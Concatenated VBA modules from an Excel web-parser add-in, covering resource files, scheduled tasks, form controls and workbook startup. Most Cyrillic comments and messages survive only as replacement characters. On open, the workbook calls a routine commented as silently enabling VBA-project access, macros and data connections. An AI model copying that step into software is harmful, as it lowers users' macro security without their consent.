'    On Error Resume Next
'    ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'    ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
'
'    If Not ObjectsCache.Exists(ObjType$) Then
'        Dim file, dic As Dictionary, key, res As New Dictionary
'        For Each file In Me.GetFileList
'            Set dic = Nothing: Set dic = Me.GetItemByName(file).GetObjectsByType(ObjType$)
'            For Each key In dic.Keys
'                res.Add key, dic.item(key)
'            Next
'        Next
'        Set dic = Nothing
'        Set ObjectsCache.item(ObjType$) = res
'        AddBalloon "GetObjectsByType |fffd|" & ObjType$ & "|fffd| from files"
'    Else
'        AddBalloon "GetObjectsByType |fffd|" & ObjType$ & "|fffd| from cache"
'    End If
'
'    Set GetObjectsByType = ObjectsCache.item(ObjType$)
'End Function

Function SupportedInterfaces() As Variant
    ' ARRAY ( CREATE, EDIT, CLONE, DELETE )
    SupportedInterfaces = Array(1, 0, 0, 1)
End Function

Function GetFileList() As Collection
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| Parent = Nothing, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Parent Parser, |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim arr, i&, AddFile As Boolean, RFname$
    Set GetFileList = New Collection
    arr = Me.ArrayOfNames
    
    For i = LBound(arr) To UBound(arr)
        RFname$ = arr(i)
        AddFile = Me.FileExist(RFname$)
        
        If Not (Me.Parent Is Nothing) Then
            AddFile = AddFile And Me.Parent.Options.ResourceFileList.Exists(RFname$ & RESOURCE_FILE_EXT$)
        End If
        If AddFile Then GetFileList.Add RFname$, CStr(RFname$)
    Next i
End Function

Sub Edit()
    On Error Resume Next
    With FP_Objects
        .Caption = "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        Set .All_Items = All_RF
        .Show
        .Initialize
    End With
End Sub

Function FileExist(ByVal ResFile_name$, Optional ByRef XML_filename$) As Boolean
    On Error Resume Next: Err.Clear
    Dim FileName$
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    If ResFile_name$ Like "*" & RESOURCE_FILE_EXT$ Then ResFile_name$ = Left(ResFile_name$, Len(ResFile_name$) - Len(RESOURCE_FILE_EXT$))
    
    ResFile_name$ = FWF.Replace_symbols(ResFile_name$, , True)
    If Trim(ResFile_name$) = "" Then Exit Function
    
    FileName$ = RESOURCE_FILES_FOLDER$ & ResFile_name$ & RESOURCE_FILE_EXT$
    If Dir(FileName$, vbNormal) <> "" Then
        FileExist = True
        XML_filename$ = FileName$
    End If
End Function

Function GetItemByName(ByVal ResFile_name$) As ResourceFile
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
    On Error Resume Next
    Dim ResFile As ResourceFile, FileName$
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    If ResFile_name$ Like "*" & RESOURCE_FILE_EXT$ Then ResFile_name$ = Left(ResFile_name$, Len(ResFile_name$) - Len(RESOURCE_FILE_EXT$))
    
    If Me.FileExist(ResFile_name$, FileName$) Then
        Set ResFile = New ResourceFile
        ResFile.Load FileName$
    End If
    Set GetItemByName = ResFile
End Function

Function ArrayOfIndexesAndNames() As Variant
    On Error Resume Next
    Dim coll As Collection, ResFilefolder$, i&, ResFile_name$
    ResFilefolder$ = RESOURCE_FILES_FOLDER$
    Set coll = FWF.FilenamesCollection(ResFilefolder$, "*" & RESOURCE_FILE_EXT$)
    If coll.Count = 0 Then ArrayOfIndexesAndNames = Array(): Exit Function
    ReDim arr(1 To coll.Count, 1 To 2)  ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For i = 1 To coll.Count
        ResFile_name$ = Replace(coll(i), ResFilefolder$, "")
        ResFile_name$ = Left(ResFile_name$, Len(ResFile_name$) - Len(RESOURCE_FILE_EXT$))
        arr(i, 1) = i
        arr(i, 2) = ResFile_name$
    Next i
    ArrayOfIndexesAndNames = arr
End Function

Function ArrayOfNames() As Variant
    On Error Resume Next
    Dim coll As Collection, ResFilefolder$, i&, ResFile_name$
    ResFilefolder$ = RESOURCE_FILES_FOLDER$
    Set coll = FWF.FilenamesCollection(ResFilefolder$, "*" & RESOURCE_FILE_EXT$)
    If coll.Count = 0 Then ArrayOfNames = Array(): Exit Function
    ReDim arr(0 To coll.Count)  ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    For i = 1 To coll.Count
        ResFile_name$ = Replace(coll(i), ResFilefolder$, "")
        ResFile_name$ = Left(ResFile_name$, Len(ResFile_name$) - Len(RESOURCE_FILE_EXT$))
        arr(i) = ResFile_name$
    Next i
    ArrayOfNames = arr
End Function

Function ArrayForListbox(Optional ByRef ParserResDictionary As Dictionary) As Variant
    On Error Resume Next
    Dim coll As Collection, ConnectedCount&, i&, ResFile_name$, files As New Collection, item
    Set coll = FWF.FilenamesCollection(RESOURCE_FILES_FOLDER$, "*" & RESOURCE_FILE_EXT$)
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    For Each item In ParserResDictionary.Keys
        files.Add item, CStr(item)
    Next item
    ConnectedCount& = ParserResDictionary.Count
    
    ' |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
    ' (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)
    For Each item In coll
        ResFile_name$ = Dir(item, vbNormal)
        'ResFile_name$ = Left(ResFile_name$, Len(ResFile_name$) - Len(RESOURCE_FILE_EXT$))
        files.Add ResFile_name$, CStr(ResFile_name$)
    Next item
    
    If files.Count = 0 Then ArrayForListbox = Array(): Exit Function
    
    ReDim arr(1 To files.Count, 1 To 3)
    For i = 1 To files.Count
        ResFile_name$ = files.item(i)
        arr(i, 1) = ResFile_name$
        arr(i, 2) = Me.GetItemByName(ResFile_name$).GetDescription
        If arr(i, 2) = "" Then arr(i, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        arr(i, 3) = (i <= ConnectedCount&)
    Next i
    ArrayForListbox = arr
End Function

Function Add(ByVal ResFile_name$, Optional ByVal Start_ResFile_Name$) As ResourceFile
    On Error Resume Next: Err.Clear
    If ResFile_name$ = "" Then
        ResFile_name$ = GetNameForNewResFile(Start_ResFile_Name$)
        If ResFile_name$ = "" Then Exit Function
    End If
    
    ResFile_name$ = FWF.Replace_symbols(ResFile_name$)
    If FileExist(ResFile_name$) Then Set Add = All_RF.GetItemByName(ResFile_name$): Exit Function
    
    Set Add = New ResourceFile
    With Add
        .Name = ResFile_name$
        .FileName = RESOURCE_FILES_FOLDER$ & ResFile_name$ & RESOURCE_FILE_EXT$
        .Save
    End With
End Function

Function GetNameForNewResFile(Optional ByVal Start_ResFile_Name$) As String
    On Error Resume Next
    Dim Def_ResFile_Name$, NewConfigName$, msg$, res, NewResFile_Name$
    If Len(Start_ResFile_Name$) > 0 Then If Not FileExist(Start_ResFile_Name$) Then Def_ResFile_Name$ = Start_ResFile_Name$
    
InputName:
    If Trim(NewConfigName$) = "" Then
        msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        res = Application.InputBox(msg, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Def_ResFile_Name$, , , , , 2)
        If VarType(res) = vbBoolean Then Exit Function
        NewResFile_Name$ = FWF.Replace_symbols(CStr(res))
        If Trim(NewResFile_Name$) = "" Then
            MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|!", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            GoTo InputName
        End If
        If FileExist(NewResFile_Name$) Then
            MsgBox "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & NewResFile_Name$ & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|.", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            Def_ResFile_Name$ = NewResFile_Name$
            GoTo InputName
        End If
    End If
    GetNameForNewResFile = NewResFile_Name$
End Function



Attribute VB_Name = "ScheduledTask"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : SchedulerTask                    Version: 1
' Author        : Igor Vakhnenko                   Date: 22.05.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text
Const XML_NODE_NAME$ = "Task"

Public Name As String

Public ParserName As String
Public OnTime As Date

Public NeedsWorkbook As Boolean
Public TargetWorkbookName As String
Public Parameter As String

Sub Activate()
    On Error Resume Next
    Dim TaskName$
    TaskName$ = Me.ParserName & ">" & Format(Me.OnTime, "DD.MM.YYYY HH:NN:SS")
    If Me.Name = "" Then Me.Name = TaskName$

    With SETT
        .Delete Me.Name, "Scheduler"
        .SetText TaskName$, Me.ExportToXML.XML, "Scheduler"
    End With
    Application.OnTime Me.OnTime, "'ParserScheduler """ & TaskName$ & """'"
End Sub

Sub Deactivate()
    On Error Resume Next
    Dim TaskName$
    TaskName$ = Me.ParserName & ">" & Format(Me.OnTime, "DD.MM.YYYY HH:NN:SS")
    If Me.Name = "" Then Me.Name = TaskName$

    SETT.Delete Me.Name, "Scheduler"
    Application.OnTime Me.OnTime, "'ParserScheduler """ & Me.Name & """'", , False
End Sub

Function ExportToXML() As IXMLDOMElement
    On Error Resume Next
    Dim XML As DOMDocument: Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        .preserveWhiteSpace = True
        Set ExportToXML = .appendChild(XML.createElement(XML_NODE_NAME$))
        With ExportToXML
            .Attributes.setNamedItem(XML.createAttribute("Version")).text = 1
            .Attributes.setNamedItem(XML.createAttribute("OnTime")).text = SETT.DTU(Me.OnTime)
            If Len(Me.Parameter) Then .Attributes.setNamedItem(XML.createAttribute("Parameter")).text = Me.Parameter
            .Attributes.setNamedItem(XML.createAttribute("NeedsWorkbook")).text = Abs(CInt(Me.NeedsWorkbook))
            If Len(Me.TargetWorkbookName) Then .Attributes.setNamedItem(XML.createAttribute("TargetWorkbookName")).text = Me.TargetWorkbookName
        End With
    End With
    Set XML = Nothing
End Function

Function LoadFromXML(ByVal txt$) As Boolean
    On Error Resume Next
    Dim XML As DOMDocument: Set XML = CreateObject("Microsoft.XMLDOM")
    With XML
        If .LoadXML(txt) Then
            Me.Parameter = "": Me.TargetWorkbookName = ""
            With .DocumentElement
                Me.Parameter = .Attributes.getNamedItem("Parameter").text
                Me.NeedsWorkbook = CBool(Val(.Attributes.getNamedItem("NeedsWorkbook").text))
                Me.TargetWorkbookName = .Attributes.getNamedItem("TargetWorkbookName").text
                Me.OnTime = SETT.DFU(Val(.Attributes.getNamedItem("OnTime").text))
            End With
            LoadFromXML = True
        End If
    End With
    Set XML = Nothing
End Function


Attribute VB_Name = "SpecialControl"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : SpecialControl                    Version:
' Author        : Igor Vakhnenko                   Date: 05.07.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Compare Text
Public WithEvents Scroller As MSForms.ScrollBar
Attribute Scroller.VB_VarHelpID = -1
Public WithEvents ScrolledCombo As MSForms.ComboBox
Attribute ScrolledCombo.VB_VarHelpID = -1
Dim ScrollEventEnabled As Boolean

Public WithEvents MainCheckboxInFrame As MSForms.CheckBox
Attribute MainCheckboxInFrame.VB_VarHelpID = -1
'Public WithEvents FontSelectCombo As MSForms.ComboBox
Public WithEvents ColorSelectCombo As MSForms.ComboBox
Attribute ColorSelectCombo.VB_VarHelpID = -1
Public WithEvents KeyNameTexbox As MSForms.TextBox
Attribute KeyNameTexbox.VB_VarHelpID = -1
Public WithEvents NumericTexbox As MSForms.TextBox
Attribute NumericTexbox.VB_VarHelpID = -1

Private Sub NumericTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    On Error Resume Next
    Select Case KeyAscii
        Case 48 To 57, 8
        Case Else: KeyAscii = 0
    End Select
End Sub

' -----------------------------------------------------------------------------------

'Private Sub FontSelectCombo_Change()
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo)
'        .ApplyToSettingsField Me.FontSelectCombo
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub
'
'Private Sub FontSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
'    On Error Resume Next: Me.FontSelectCombo.SelStart = 1
'    With New FontParameters
'        .LoadFromText (Me.FontSelectCombo): .PickNewFont
'        Me.FontSelectCombo = .ExportToText
'
'        Dim UF As Object: Set UF = Me.FontSelectCombo
'        While TypeName(UF) <> "UserForm": Set UF = UF.Parent: Wend
'        UF.Show
'    End With
'    Me.FontSelectCombo.SelStart = 1
'End Sub

' -----------------------------------------------------------------------------------
'Private Sub KeyNameTexbox_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
'    KeyAscii = 0
'End Sub
'Private Sub KeyNameTexbox_KeyUp(ByVal KeyCode As MSForms.ReturnInteger, ByVal Shift As Integer)
'    On Error Resume Next: Button$ = GetKeyName(KeyCode, Shift)
'    If Len(Button$) Then KeyCode = 0: Me.KeyNameTexbox = Button$
'End Sub
' -----------------------------------------------------------------------------------
Private Sub ColorSelectCombo_Change()
    On Error Resume Next: clr& = Val(Me.ColorSelectCombo)
    If clr& >= 0 Then
        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
    Else
         clr& = vbButtonFace
        Me.ColorSelectCombo.ForeColor = clr&: Me.ColorSelectCombo.BackColor = clr&
    End If
End Sub

Private Sub ColorSelectCombo_MouseUp(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    On Error Resume Next: clr& = PickNewColor(IIf(Me.ColorSelectCombo = "", xlNone, Val(Me.ColorSelectCombo)))
    Me.ColorSelectCombo = clr&
End Sub

' -----------------------------------------------------------------------------------
Private Sub MainCheckboxInFrame_Change()
    On Error Resume Next: Err.Clear
    Dim fr As MSForms.Frame, ctrl As MSForms.Control: Set fr = Me.MainCheckboxInFrame.Parent
    If Err <> 0 Or (fr Is Nothing) Then MsgBox "MainCheckboxInFrame.Parent is not frame control": Exit Sub
    For Each ctrl In fr.Controls
        If ctrl.Name <> Me.MainCheckboxInFrame.Name Then
            ctrl.Enabled = Me.MainCheckboxInFrame.value
        End If
    Next
End Sub
' -----------------------------------------------------------------------------------
Function FieldFound() As Boolean
    On Error Resume Next
    If Not ScrolledCombo Is Nothing Then FieldFound = True: Exit Function
    ScrollEventEnabled = False: Me.Scroller.value = 1: ScrollEventEnabled = True
    Dim ctrl As MSForms.Control
    For Each ctrl In Me.Scroller.Parent.Controls
        If TypeName(ctrl) = "ComboBox" Then
            If ctrl.Top < Scroller.Top And ctrl.Left < Scroller.Left And _
               ctrl.Top + ctrl.Height > Scroller.Top + Scroller.Height And ctrl.Left + ctrl.Width > Scroller.Left + Scroller.Width Then
                Set ScrolledCombo = ctrl
                FieldFound = True: Exit Function
            End If
        End If
    Next
    MsgBox "Combo not found", , Me.Scroller.Name
End Function

Private Sub Scroller_Change()
    On Error Resume Next: If Not Me.FieldFound Then Exit Sub
    If Not ScrollEventEnabled Then Exit Sub
    Select Case Me.Scroller.value
        Case 0: Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex + 1
        Case 2: If Me.ScrolledCombo.ListIndex > 0 Then Me.ScrolledCombo.ListIndex = Me.ScrolledCombo.ListIndex - 1
    End Select
    ScrollEventEnabled = False: Me.Scroller.value = 1: ScrollEventEnabled = True
End Sub

Attribute VB_Name = "ThisWB"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
'---------------------------------------------------------------------------------------
' Author        : Igor Vakhnenko                   Date: 25.12.2015
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit

Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    RemoveItemsFromCellContextMenu
    If Not IE Is Nothing Then IE.Quit: Set IE = Nothing
    If Not wHTTP Is Nothing Then Set wHTTP = Nothing

    Close_All_Plugins
    DeleteProgramCommandBar
End Sub

Private Sub Workbook_Open()
    On Error Resume Next: Dim FirstRun As Boolean
    FirstRun = SETT.IsFirstRun
    If FirstRun Then ShowFirstRunForm
    If SetupCancelled Then
        Application.DisplayAlerts = False
        If TrueDeveloper Then MsgBox "Setup Cancelled", vbInformation Else ThisWorkbook.Close False
        Application.DisplayAlerts = True
        Exit Sub
    End If
    Enable_AccessVBOM_Macro_DataConnections        ' disables notifications
    SaveSetting PROJECT_NAME$, "Setup", "AddinPath", ThisWorkbook.FullName
    'If FirstRun Then If IsObject(F_Greeting) Then F_Greeting.Show
    CreateProgramCommandBar 0
    AddItemsIntoCellContextMenu
End Sub

Attribute VB_Name = "URLerrors"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Variable"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'---------------------------------------------------------------------------------------
' Module        : Variable                    Version:
' Author        : Igor Vakhnenko                   Date: 24.10.2016
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/        info@excelvba.ru      Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Text

Const XML_NODE_NAME$ = "Variable"
Const DEFAULT_CTRL_HEIGHT& = 42, DEFAULT_LABEL_HEIGHT& = 24, FRAME_PADDING& = 12, FRAME_PADDING_TOP& = 16
Public Parent As Variables

Public Name As String
Public Index As Long
Public ControlType As String    ' combo / checkbox / textbox
Public LabelText As String
Public DefaultValue As String
Public value As String    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
Public Source As Variant    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| combobox (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |)
Public Hidden As Boolean
Public LastValue As String    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Public WithEvents ctrl_CheckBox As MSForms.CheckBox
Attribute ctrl_CheckBox.VB_VarHelpID = -1
Public WithEvents ctrl_TextBox As MSForms.TextBox
Attribute ctrl_TextBox.VB_VarHelpID = -1
Public WithEvents ctrl_ListBox As MSForms.ListBox
Attribute ctrl_ListBox.VB_VarHelpID = -1
Public WithEvents ctrl_ComboBox As MSForms.ComboBox
Attribute ctrl_ComboBox.VB_VarHelpID = -1
Dim ctrl As MSForms.Control, Label As MSForms.Label

Public Rendered_DefaultValue As String
Public Rendered_Value As String
Public Rendered_Source As Variant    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 0
Dim StopControlEvents As Boolean

Private Sub Class_Terminate()
    Set Parent = Nothing: Set ctrl = Nothing: Set Label = Nothing
    Set ctrl_CheckBox = Nothing: Set ctrl_TextBox = Nothing: Set ctrl_ListBox = Nothing: Set ctrl_ComboBox = Nothing
End Sub

Function Edit() As Boolean
    On Error Resume Next
    Set EditingVariable_XMLNode = Me.ExportToXML
    F_Variable_Edit.Show

    If EditingVariable_XMLNode Is Nothing Then    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Exit Function
    Else    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Me.LoadFromXML EditingVariable_XMLNode
        Set EditingVariable_XMLNode = Nothing
        Edit = True
    End If
End Function

Function CreateControl(ByRef context As MSForms.Frame, ByVal ind&, Optional ByVal ColumnsNumber& = 2) As Boolean
    On Error Resume Next
    Dim NeedsLabel As Boolean, params As New Dictionary, ParamList$, v, pn$, pv$, BaseColumn&
    NeedsLabel = True: params.CompareMode = TextCompare

    ParamList$ = Application.Trim(Split(Trim(ControlType), , 2)(1))    ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
    For Each v In Split(ParamList$)
        pn$ = "": pv$ = ""
        pn$ = Split(v, "=")(0)
        pv$ = Split(v, "=", 2)(1)
        params.item(pn$) = pv$
    Next

    RenderParameters
    If Me.value = "" Then Me.value = Me.Rendered_DefaultValue
    StopControlEvents = True

    If params.Exists("column") Then BaseColumn& = Val(params.item("column"))
    If BaseColumn& <= 0 Then BaseColumn& = 1

    Select Case Split(Trim(ControlType))(0)
        Case "CheckBox"
            Set ctrl_CheckBox = context.Controls.Add("Forms.CheckBox.1")
            ctrl_CheckBox.Caption = Me.LabelText
            Set ctrl = ctrl_CheckBox
            ctrl_CheckBox.value = CBool(Me.value)
            NeedsLabel = False

        Case "TextBox"
            Set ctrl_TextBox = context.Controls.Add("Forms.TextBox.1")
            ctrl_TextBox.Font.Size = 9: ctrl_TextBox.Font.Bold = True
            If params.Exists("password") Then ctrl_TextBox.PasswordChar = "*"
            Set ctrl = ctrl_TextBox
            ctrl_TextBox.text = Me.value

        Case "ListBox"
            Set ctrl_ListBox = context.Controls.Add("Forms.ListBox.1")
            Set ctrl = ctrl_ListBox

            If params.Exists("option") Then ctrl_ListBox.ListStyle = fmListStyleOption

            ctrl_ListBox.MultiSelect = fmMultiSelectExtended
